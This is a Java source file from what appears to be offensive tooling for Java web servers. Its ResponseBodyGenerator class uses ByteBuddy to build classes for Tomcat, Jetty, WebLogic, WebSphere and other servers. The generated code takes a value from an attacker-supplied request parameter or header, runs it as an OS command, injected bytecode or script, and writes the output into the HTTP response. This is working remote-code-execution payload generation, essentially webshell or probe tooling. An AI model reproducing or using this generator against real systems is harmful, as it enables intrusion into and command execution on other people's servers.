package com.reajason.javaweb.probe.generator.response;

import com.reajason.javaweb.GenerationException;
import com.reajason.javaweb.Server;
import com.reajason.javaweb.buddy.MethodCallReplaceVisitorWrapper;
import com.reajason.javaweb.buddy.TargetJreVersionVisitorWrapper;
import com.reajason.javaweb.probe.ProbeContent;
import com.reajason.javaweb.probe.config.ProbeConfig;
import com.reajason.javaweb.probe.config.ResponseBodyConfig;
import com.reajason.javaweb.probe.generator.ByteBuddyShellGenerator;
import com.reajason.javaweb.probe.payload.ByteCodeProbe;
import com.reajason.javaweb.probe.payload.CommandProbe;
import com.reajason.javaweb.probe.payload.ScriptEngineProbe;
import com.reajason.javaweb.probe.payload.response.*;
import com.reajason.javaweb.utils.ShellCommonUtil;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.asm.Advice;
import net.bytebuddy.dynamic.DynamicType;
import net.bytebuddy.implementation.FixedValue;
import org.apache.commons.lang3.StringUtils;
import org.eclipse.jetty.server.Request;

import java.lang.annotation.Retention;
import java.lang.annotation.RetentionPolicy;
import java.nio.charset.Charset;

import static java.nio.charset.StandardCharsets.UTF_8;
import static net.bytebuddy.matcher.ElementMatchers.named;

/**
 * @author ReaJason
 * @since 2025/6/29
 */
public class ResponseBodyGenerator extends ByteBuddyShellGenerator<ResponseBodyConfig> {
    public ResponseBodyGenerator(ProbeConfig probeConfig, ResponseBodyConfig probeContentConfig) {
        super(probeConfig, probeContentConfig);
    }

    @Override
    protected DynamicType.Builder<?> build(ByteBuddy buddy) {
        String name = probeContentConfig.getReqParamName();
        Class<?> getDataFromReqInterceptor = getDataFromReqInterceptor.class;
        if (Server.Jetty.equals(probeContentConfig.getServer())) {
            getDataFromReqInterceptor = getDataFromReqJettyInterceptor.class;
        }
        Class<?> writerClass = getWriterClass();
        Class<?> runnerClass = getRunnerClass();
        DynamicType.Builder<?> builder = buddy.redefine(writerClass)
                .name(probeConfig.getShellClassName())
                .visit(new TargetJreVersionVisitorWrapper(probeConfig.getTargetJreVersion()))
                .visit(Advice.withCustomMapping()
                                .bind(ValueAnnotation.class, probeContentConfig.getCommandTemplate())
                                .to(runnerClass)
                                .on(named("run")));
        String base64Bytes = probeContentConfig.getBase64Bytes();
        if (ProbeContent.Bytecode.equals(probeConfig.getProbeContent()) && StringUtils.isNotBlank(base64Bytes)) {
            builder = builder.method(named("getDataFromReq")).intercept(FixedValue.value(base64Bytes));
        } else {
            builder = builder.visit(MethodCallReplaceVisitorWrapper.newInstance("getDataFromReq",
                            probeConfig.getShellClassName(), ShellCommonUtil.class.getName()))
                    .visit(Advice.withCustomMapping().bind(ValueAnnotation.class, name)
                            .to(getDataFromReqInterceptor).on(named("getDataFromReq")));
        }
        return builder;
    }

    private Class<?> getRunnerClass() {
        switch (probeConfig.getProbeContent()) {
            case Command:
                return CommandProbe.class;
            case Bytecode:
                return ByteCodeProbe.class;
            case ScriptEngine:
                return ScriptEngineProbe.class;
            default:
                throw new GenerationException("responseBody not supported for probe content: " + probeConfig.getProbeContent());
        }
    }

    private Class<?> getWriterClass() {
        switch (probeContentConfig.getServer()) {
            case Server.SpringWebMvc:
                return SpringWebMvcWriter.class;
            case Server.Jetty:
                return JettyWriter.class;
            case Server.Tomcat:
            case Server.JBoss:
            case Server.BES:
                return TomcatWriter.class;
            case Server.TongWeb:
                return TongWebWriter.class;
            case Server.Resin:
                return ResinWriter.class;
            case Server.Undertow:
                return UndertowWriter.class;
            case Server.GlassFish:
            case Server.InforSuite:
                return GlassFishWriter.class;
            case Server.WebSphere:
                return WebSphereWriter.class;
            case Server.WebLogic:
                return WebLogicWriter.class;
            case Server.Apusic:
                return ApusicWriter.class;
            case Server.Struct2:
                return Struct2Writer.class;
            default:
                throw new GenerationException("responseBody not supported for server: " + probeContentConfig.getServer());
        }
    }

    static class getDataFromReqInterceptor {
        @Advice.OnMethodExit
        public static void enter(@Advice.Argument(value = 0) Object request,
                                 @ValueAnnotation String name,
                                 @Advice.Return(readOnly = false) String ret) throws Exception {
            try {
                String p = (String) ShellCommonUtil.invokeMethod(request, "getParameter", new Class[]{String.class}, new Object[]{name});
                if (p == null || p.isEmpty()) {
                    p = (String) ShellCommonUtil.invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{name});
                }
                ret = p;
            } catch (Exception e) {
                ret = null;
            }
        }
    }

    static class getDataFromReqJettyInterceptor {
        @Advice.OnMethodExit
        public static void enter(@Advice.Argument(value = 0) Object request,
                                 @ValueAnnotation String name,
                                 @Advice.Return(readOnly = false) String ret) throws Exception {
            try {
                String p = (String) ShellCommonUtil.invokeMethod(request, "getParameter", new Class[]{String.class}, new Object[]{name});
                if (p == null || p.isEmpty()) {
                    p = (String) ShellCommonUtil.invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{name});
                }
                ret = p;
            } catch (Exception e) {
                Object parameters = Request.class.getMethod("extractQueryParameters", Request.class, Charset.class).invoke(null, request, UTF_8);
                String p = (String) ShellCommonUtil.invokeMethod(parameters, "getValue", new Class[]{String.class}, new Object[]{name});
                if (p == null || p.isEmpty()) {
                    Object headers = ShellCommonUtil.invokeMethod(request, "getHeaders", null, null);
                    p = (String) ShellCommonUtil.invokeMethod(headers, "get", new Class[]{String.class}, new Object[]{name});
                }
                ret = p;
            }
        }
    }

    @Retention(RetentionPolicy.RUNTIME)
    public @interface ValueAnnotation {
    }
}




